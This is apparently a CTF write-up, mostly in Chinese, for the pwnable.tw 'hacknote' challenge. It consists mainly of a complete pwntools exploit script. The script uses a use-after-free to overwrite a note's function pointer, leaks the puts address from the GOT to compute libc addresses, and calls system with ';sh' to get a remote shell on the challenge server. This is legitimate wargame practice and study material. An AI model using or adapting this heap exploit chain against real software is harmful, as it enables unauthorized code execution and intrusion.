# poc

```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

> uaf -> 泄漏libc -> 执行system("&system;sh\x00")

`free`只释放内存，没置空指针，因此考虑申请node0及node1，note长度要大于12，然后释放node0，node1，再申请node2，最长可以控制node0的12B内存。而node0前4B是调用`puts`，参数是后4B，因此考虑泄漏`libc`中某个函数的地址，从而得到`system`地址。释放node2，申请node3仍可修改node0内容，其中前4B替换为`system`，但参数变为`system`地址开始的字符串，`system`参数需要用`;`进行间隔才能正确拿shell，因此后面内容设置为`;sh\x00`即可。（注意`'\n'`也是一个字符，会影响长度)

# exp

```python
from pwn import *

context(arch = 'i386', os = 'linux', log_level = 'debug')

DEBUG = 0

f = ELF('hacknote.dms')

if DEBUG:
    p = process('hacknote.dms')
    gdb.attach(p)
    e = ELF('libc-2.23.so')
else:
    p = remote('chall.pwnable.tw', 10102)
    e = ELF('libc_32.so.6')

def add(size, content):
    p.recvuntil(':')
    p.sendline('1')
    p.recvuntil(':')
    p.sendline(str(size))
    p.recvuntil(':')
    p.sendline(str(content))

def free(index):
    p.recvuntil(':')
    p.sendline('2')
    p.recvuntil(':')
    p.sendline(str(index))

def prt(index):
    p.recvuntil(':')
    p.sendline('3')
    p.recvuntil(':')
    p.sendline(str(index))

add(100, 1)
add(100, 1)
free(0)
free(1)

puts = 0x0804862B
puts_got = f.got['puts']

add(9, p32(puts) + p32(puts_got))
prt(0)

puts_addr = u32(p.recv(4))
libc_base = puts_addr - e.symbols['puts']
system_addr = libc_base + e.symbols['system']

free(2)
add(9, p32(system_addr) + ';sh\x00')
prt(0)

p.interactive()
```
